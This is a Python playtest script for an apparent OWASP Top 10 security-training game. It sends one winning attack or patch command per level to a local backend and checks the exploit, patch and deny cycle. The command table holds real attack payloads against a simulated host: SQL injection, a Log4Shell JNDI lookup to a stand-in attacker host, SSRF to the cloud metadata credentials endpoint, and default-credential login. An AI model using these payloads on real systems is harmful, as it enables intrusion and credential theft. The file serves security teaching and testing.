"""Playtest for the vulnerability-first patch gate (architecture.md #4a) - hits the
real running backend, not mocked, same convention as every prior playtest in this
project. Run with the backend already up: python test_patch_gate.py
"""
import json
import urllib.request
import uuid

BASE = "http://localhost:8000"

# One known winning command per level, built from each level's own default_values
# (no live Ollama in dev, so materialization always falls back to these).
WINNING_COMMAND = {
    "red-01-broken-access-control": "curl http://10.0.0.5/api/invoices/1043",
    "blue-01-broken-access-control": "patch /var/www/api/invoices.php --enable-ownership-check",
    "red-02-cryptographic-failures": "crack-hash 5f4dcc3b5aa765d61d8327deb882cf99 --wordlist common.txt --guess password",
    "blue-02-cryptographic-failures": "rehash-password admin --algorithm bcrypt",
    "red-03-injection": "curl -X POST http://10.0.0.5/admin/login -d \"username=' OR '1'='1' -- &password=x\"",
    "blue-03-injection": "patch /var/www/admin/login.php --use-parameterized-queries",
    "red-04-insecure-design": 'curl -X POST http://10.0.0.5/api/cart/checkout -d "item=widget&quantity=-5"',
    "blue-04-insecure-design": "patch /var/www/api/checkout.php --enforce-positive-quantity",
    "red-05-security-misconfiguration": "curl -u admin:admin http://10.0.0.5:8080/manager/html",
    "blue-05-security-misconfiguration": "patch /etc/tomcat/tomcat-users.xml --disable-default-admin",
    "red-06-vulnerable-components": 'curl http://10.0.0.5/ -H "User-Agent: ${jndi:ldap://attacker.evil/a}"',
    "blue-06-vulnerable-components": "upgrade log4j --to 2.17.1",
    "red-07-auth-failures": 'curl -X POST http://10.0.0.5/login -d "username=guest&password=letmein"',
    "blue-07-auth-failures": "patch /etc/app/auth.conf --enable-lockout --max-attempts 5",
    "red-08-integrity-failures": 'curl http://10.0.0.5/dashboard --cookie "session_data=O:5:\\"Alert\\":0:{}"',
    "blue-08-integrity-failures": "patch /var/www/app/session.php --use-signed-json",
    "red-09-logging-failures": "curl -o customers.db http://10.0.0.5/backups/customers.db",
    "blue-09-logging-failures": "start audit-logging --enable-alerts",
    "red-10-ssrf": 'curl "http://10.0.0.5/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"',
    "blue-10-ssrf": "patch /var/www/api/preview.php --block-internal-ranges",
}


def _get(path: str):
    with urllib.request.urlopen(f"{BASE}{path}") as resp:
        return json.load(resp)


def _post_command(level_id: str, session_id: str, command: str) -> dict:
    body = json.dumps({"session_id": session_id, "input": command}).encode()
    req = urllib.request.Request(
        f"{BASE}/api/levels/{level_id}/command",
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req) as resp:
        return json.load(resp)


def main() -> None:
    vulns = _get(f"/api/vulnerabilities?session_id={uuid.uuid4()}")
    assert len(vulns) == 10, f"expected 10 categories, got {len(vulns)}"
    assert [v["order"] for v in vulns] == list(range(1, 11)), "categories not in order 1-10"

    for vuln in vulns:
        red_id, blue_id = vuln["red_level_id"], vuln["blue_level_id"]
        assert red_id in WINNING_COMMAND, f"no known winning command for {red_id}"
        assert blue_id in WINNING_COMMAND, f"no known winning command for {blue_id}"

        session_id = str(uuid.uuid4())

        result = _post_command(red_id, session_id, WINNING_COMMAND[red_id])
        assert result["wins_level"], f"{red_id} should win pre-patch, got {result}"

        result = _post_command(blue_id, session_id, WINNING_COMMAND[blue_id])
        assert result["wins_level"], f"{blue_id} should win, got {result}"

        entry = next(
            v for v in _get(f"/api/vulnerabilities?session_id={session_id}")
            if v["owasp_category"] == vuln["owasp_category"]
        )
        assert entry["exploited"] and entry["patched"], f"{vuln['owasp_category']} hub status wrong: {entry}"

        result = _post_command(red_id, session_id, WINNING_COMMAND[red_id])
        assert not result["wins_level"], f"{red_id} should be denied post-patch, got {result}"
        assert "patched" in result["terminal_output"].lower(), f"{red_id} denial message unclear: {result}"

        fresh_session = str(uuid.uuid4())
        result = _post_command(red_id, fresh_session, WINNING_COMMAND[red_id])
        assert result["wins_level"], f"{red_id} should win again in a fresh session, got {result}"

        print(f"OK  {vuln['owasp_category']}")

    print(f"\n{len(vulns)}/10 vulnerabilities passed exploit -> patch -> denied -> fresh-session-works")


if __name__ == "__main__":
    main()
